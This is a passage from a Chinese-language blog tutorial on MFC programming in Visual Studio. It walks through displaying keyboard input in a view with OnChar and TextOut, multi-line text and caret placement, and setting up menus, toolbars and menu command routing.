class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagTEXTMETRICW</span></span><br><span class="line">&#123;</span><br><span class="line">    LONG        tmHeight;</span><br><span class="line">    LONG        tmAscent;</span><br><span class="line">    LONG        tmDescent;</span><br><span class="line">    LONG        tmInternalLeading;</span><br><span class="line">    LONG        tmExternalLeading;</span><br><span class="line">    LONG        tmAveCharWidth;</span><br><span class="line">    LONG        tmMaxCharWidth;</span><br><span class="line">    LONG        tmWeight;</span><br><span class="line">    LONG        tmOverhang;</span><br><span class="line">    LONG        tmDigitizedAspectX;</span><br><span class="line">    LONG        tmDigitizedAspectY;</span><br><span class="line">    WCHAR       tmFirstChar;</span><br><span class="line">    WCHAR       tmLastChar;</span><br><span class="line">    WCHAR       tmDefaultChar;</span><br><span class="line">    WCHAR       tmBreakChar;</span><br><span class="line">    BYTE        tmItalic;</span><br><span class="line">    BYTE        tmUnderlined;</span><br><span class="line">    BYTE        tmStruckOut;</span><br><span class="line">    BYTE        tmPitchAndFamily;</span><br><span class="line">    BYTE        tmCharSet;</span><br><span class="line">&#125; TEXTMETRICW, *PTEXTMETRICW, NEAR *NPTEXTMETRICW, FAR *LPTEXTMETRICW;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="keyword">typedef</span> TEXTMETRICW TEXTMETRIC;</span><br></pre></td></tr></table></figure><p>反正传入这个的目的就是为了获取到里面的hight。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CClientDC</span> : <span class="keyword">public</span> CDC</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CClientDC)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">CClientDC</span><span class="params">(CWnd* pWnd)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attributes</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">HWND m_hWnd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CClientDC</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">AssertValid</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Dump</span><span class="params">(CDumpContext&amp; dc)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>显然这个类是继承CDC的一个派生类，那么这个派生类也能拿到基类的设备上下文了。</p><p>跑起来之后反正目前看上去差别不大。</p><p>光标位置有了，就是输入的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这玩意也比较有意思。<br>当我们在输出的地方打印这个uChar的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/025.png" class=""><p>也就是每当键盘按下一个键，他就会接收到。既然它能接收到，那就好办了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">m_strText += (TCHAR)nChar;</span><br><span class="line">dc.<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入肯定还是要获取设备上下文的，然后就是TextOut的最后一个参数是Cstring，在这里创建临时变量的话，也不能保证后面别的地方会不会用到，就干脆在类里面新建一个成员保存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_cur;<span class="comment">//当前点位，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br><span class="line">BOOL m_status;<span class="comment">//绘制状态</span></span><br><span class="line">CString m_strText;<span class="comment">//用户输出的字符串</span></span><br></pre></td></tr></table></figure><p>这里<code>m_strText += (TCHAR)nChar;</code>转换是因为vs2022反正项目默认都是unicode编码的也就是宽字节，所有的字符占两个字节，而多字节也就是ANSI，在ANSI中英文占用一个字节，所以二者会有区别。这也是有的时候要么改编码环境要么强转。</p><p>跑起来试试</p><img src="/2022/07/25/mfc01/026.png" class=""><p>可以看到还是有点问题，比如这个光标不移动，还要每次输入闪烁很明显，闪烁肯定是重绘的问题。<br>所以在重绘函数ondraw里面来一次textout就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在onchar消息里面刷新</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnChar</span><span class="params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%c\r\n&quot;</span>, nChar);</span><br><span class="line"><span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">m_strText += (TCHAR)nChar;</span><br><span class="line">dc.<span class="built_in">TextOut</span>(<span class="number">0</span>, <span class="number">0</span>, m_strText);</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnChar</span>(nChar, nRepCnt, nFlags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>闪烁问题就解决了。</p><p><strong>另外测试的时候回车键有点问题，因为没有对\n进行处理</strong></p><p>其实这些操作都是在考虑一个消息该怎么处理</p><ol><li>要确定响应什么消息，像鼠标按下，就是lbuttondown</li><li>添加消息响应函数，快捷方式从消息中add</li><li>追加消息响应内容，默认是空的，你要给这个消息额外写一些功能</li></ol><p>其中比较麻烦的就是确定响应哪个消息，一开始肯定是不知道了只能查了。还有就是响应规则，有些会和头部预先定义的相关，有些则是全都由自己来写。</p><p>那么现在还有两个问题，一个多行文本一个光标移动。</p><p>换行这个问题其实根本在TextOut上，因为这个方法不具备换行能力。而我们又要考虑重绘的问题，就需要在OnDraw里改动。<br>最简单的就是用循环，然后if判断输入的是是否为换行，如果是就要让TextOut的y轴变大。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个属性的笔</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">CString sub = _T(<span class="string">&quot;&quot;</span>);<span class="comment">//用来记录要绘制的字符</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; m_strText.<span class="built_in">GetLength</span>(); i++ ) &#123;</span><br><span class="line"><span class="keyword">if</span> (( m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\n&#x27;</span> ) || (m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\r&#x27;</span>)) &#123;</span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">sub.<span class="built_in">Empty</span>();</span><br><span class="line">y += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub += m_strText.<span class="built_in">GetAt</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub不为空就直接打印</span></span><br><span class="line"><span class="keyword">if</span> ( !sub.<span class="built_in">IsEmpty</span>() ) pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/027.png" class=""><p>换行的效果实现了，这里比较坑的是<code>if (( m_strText.GetAt(i) == &#39;\n&#39; ) || (m_strText.GetAt(i) == &#39;\r&#39;))</code>获取的换行符好像会被\r顶掉，但是\n还是得保留，因为键盘输入的角度都是\r了，但是万一黏贴的文本是个\n就有点搞了。<br>不过显然是获取数据的时候有点小问题，要是不想在这if，可能就要在onchar消息里面修改掉。</p><p>最后就是光标</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDraw</span><span class="params">(CDC* pDC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMFCPaintDoc* pDoc = <span class="built_in">GetDocument</span>();</span><br><span class="line"><span class="built_in">ASSERT_VALID</span>(pDoc);</span><br><span class="line"><span class="keyword">if</span> (!pDoc)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处为本机数据添加绘制代码</span></span><br><span class="line"><span class="function">CPen <span class="title">pen</span><span class="params">(PS_DASH, <span class="number">4</span>, RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CPen *pPen = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;pen);</span><br><span class="line"><span class="function">CBrush <span class="title">brush</span><span class="params">(RGB(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">CBrush *pBrush = pDC-&gt;<span class="built_in">SelectObject</span>(&amp;brush);</span><br><span class="line"></span><br><span class="line">LOGPEN logpen;</span><br><span class="line">pPen-&gt;<span class="built_in">GetLogPen</span>(&amp;logpen);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;\nstyle:%d width:%d color:%08X\n&quot;</span>, logpen.lopnStyle, logpen.lopnWidth, logpen.lopnColor);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_cur), &amp;brush);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">pDC-&gt;<span class="built_in">FillRect</span>(<span class="built_in">CRect</span>(m_start, m_stop), &amp;brush);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还原笔的属性是为了保证后面要画的时候不会还是这个类型</span></span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pPen);</span><br><span class="line">pDC-&gt;<span class="built_in">SelectObject</span>(pBrush);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重绘字符串</span></span><br><span class="line">CString sub = _T(<span class="string">&quot;&quot;</span>);<span class="comment">//用来记录要绘制的字符</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; m_strText.<span class="built_in">GetLength</span>(); i++ ) &#123;</span><br><span class="line"><span class="keyword">if</span> (( m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\n&#x27;</span> ) || (m_strText.<span class="built_in">GetAt</span>(i) == <span class="string">&#x27;\r&#x27;</span>)) &#123;</span><br><span class="line">pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line">CSize sz = pDC-&gt;<span class="built_in">GetTextExtent</span>(sub);</span><br><span class="line">sub.<span class="built_in">Empty</span>();</span><br><span class="line"><span class="comment">//y += 20;</span></span><br><span class="line">y += sz.cy + <span class="number">2</span>;<span class="comment">//+2是为了留点行间距</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub += m_strText.<span class="built_in">GetAt</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环里面</span></span><br><span class="line"><span class="keyword">if</span> ( !sub.<span class="built_in">IsEmpty</span>() ) pDC-&gt;<span class="built_in">TextOut</span>(<span class="number">0</span>, y, sub);</span><br><span class="line"></span><br><span class="line"><span class="comment">//移动光标</span></span><br><span class="line">CPoint cp;</span><br><span class="line">CSize sz = pDC-&gt;<span class="built_in">GetTextExtent</span>(sub);</span><br><span class="line">cp.y = y;<span class="comment">//y是局部设置好的</span></span><br><span class="line">cp.x = sz.cx;<span class="comment">//通过捕捉sub，得到x和y</span></span><br><span class="line"><span class="built_in">SetCaretPos</span>(cp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>光标的y轴还算好计算的，毕竟换行的时候就会根据y改变<br>x则需要借助<code>CSize sz = pDC-&gt;GetTextExtent(sub);</code>这么一个获取设备上下文的文字范围。其中最为关键的就是cx和cy。<br>所以也修改了换行的时候y的值，但从20这个固定值，只能保证常用字符，有些汉字什么的就不能保证了，所以还是主动获取最好。</p><p><strong>要注意，换行前的xy和换行后的xy肯定是不同的，不要想着用一个CSize</strong></p><img src="/2022/07/25/mfc01/028.png" class=""><p>效果差不多了。</p><p>像玩的深入的还能这样该后面的移动光标<br><code>SetCaretPos(CPoint(sz.cx + 2, y));</code><br>一句话就该过去了，实际上也是用了父类子类之间的关系，然后就是构造函数。<br>看了老师的操作雀食不一样，还有一种调用系统api的方式<code>::SetCaretPos(sz.cx + 2, y);</code>，不过毕竟是系统api，不是mfc的直接内容，所以有的时候为了项目维护还是不搞花里胡哨的。</p><p>但是仍然有很多不足</p><ol><li>没有删除的功能</li><li>比如左键拖动选中文字，文字的背景颜色会变黑之类的</li></ol><p>这些日后再说</p><hr><h2 id="菜单和工具栏"><a href="#菜单和工具栏" class="headerlink" title="菜单和工具栏"></a>菜单和工具栏</h2><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><img src="/2022/07/25/mfc01/029.png" class=""><p>资源视图没有的，在vs的菜单栏找到视图，再找其他窗口里面就有了。</p><p>然后就是经典设计，注意修改id，默认尾巴跟数字不利于使用和查看。然后描述文字<code>画矩形(&amp;R)</code>后面的是快捷键的一种表达方式，反正具体的应该是mfc写好了。我们只要跟着这样格式写就行。alt+你所输入的字符即为快捷键</p><img src="/2022/07/25/mfc01/030.png" class=""><p>跑起来效果肯定就没啥差别</p><img src="/2022/07/25/mfc01/031.png" class=""><p>灰色应该是没有事件处理，就是死的按钮。</p><p>然后就是给这个菜单绑定事件</p><img src="/2022/07/25/mfc01/032.png" class=""><p>类别表选择view。看下面的菜单命令路由</p><img src="/2022/07/25/mfc01/033.png" class=""><p>确定之后就会加载一个空的函数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDrawLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TRACE(&quot;%s(%d):%s\r\n&quot;, __FILE__, __LINE__, __FUNCTION__);</code><br>这条内容主要是打印文件路径，然后行号，还有就是函数名<br>典型的debug调试时候使用。</p><p>我们把画矩形绑定事件，不同的就是类列表不同，前面那个在view下，这个在doc下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintDoc::OnDrwaRect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\r\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后run一个<br>当我们点击了这个画线和画矩形的时候，输出那里就能看到详细的文件路径、行号和函数名</p><img src="/2022/07/25/mfc01/034.png" class=""><p>有意思的是双击输出中的这一行TRACE打印的内容他会直接跳转到这个函数的位置</p><img src="/2022/07/25/mfc01/035.png" class=""><p>对于测试来说这个肯定挺好用的。</p><hr><h3 id="菜单命令路由"><a href="#菜单命令路由" class="headerlink" title="菜单命令路由"></a>菜单命令路由</h3><ol><li>有view和doc，触发了view，但是没有触发doc</li><li>去掉view类的菜单响应函数，打开doc类的响应函数。触发view类，不触发doc；view &gt; doc</li><li>去掉了doc类的菜单响应函数，打开框架类的响应函数触发doc类，不触发app；doc &gt; 框架</li><li>去掉了app类的菜单响应函数，打开app类的响应函数； 框架 &gt; app</li></ol><p>所以响应菜单的命令顺序：view &gt; doc &gt; 框架 &gt; app<br>在这个mfc程序里面看：CMFCPaintView &gt; CMFCPaintDoc &gt; CMainFrame &gt; CMFCPanitApp</p><p>测试的方式可以通过<code>TRACE(&quot;%s(%d):%s\r\n&quot;, __FILE__, __LINE__, __FUNCTION__);</code><br>在view中都绑定事件，然后在其它doc下也绑定，看看到底先触发的是view还是什么。</p><p><strong>经典MVC模式中，M是指业务模型，V是指用户界面，C则是控制器，使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式。其中，View的定义比较清晰，就是用户界面。</strong></p><hr><h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><p>也是通过资源视图去找，找到toolbar，然后叫mainframe</p><img src="/2022/07/25/mfc01/036.png" class=""><img src="/2022/07/25/mfc01/037.png" class=""><p>下面哪个256是因为有别的颜色，但是本身都是一个东西，所以做一个东西俩都要弄</p><img src="/2022/07/25/mfc01/038.png" class=""><img src="/2022/07/25/mfc01/039.png" class=""><p>绘制完成后，修改id</p><img src="/2022/07/25/mfc01/040.png" class=""><p><strong>注意，如果这个id选择的是以前写过内容的id，那么这个工具栏的按钮就会绑定之前的内容</strong><br>比如我这个又使用<code>DRAW_LINE</code>这是之前测试的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnDrawLine</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\r\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内容是这样的，我们run这个程序点击看看是否会触发</p><img src="/2022/07/25/mfc01/041.png" class=""><p>我们点击了三次，它也的确触发了三次，说明确实绑定了。</p><p><strong>删除这个工具栏的选项，要点击然后拖出去就能删掉了，默认没啥地方有删除选项</strong></p><hr><h3 id="mfc结构文档"><a href="#mfc结构文档" class="headerlink" title="mfc结构文档"></a>mfc结构文档</h3><p><a 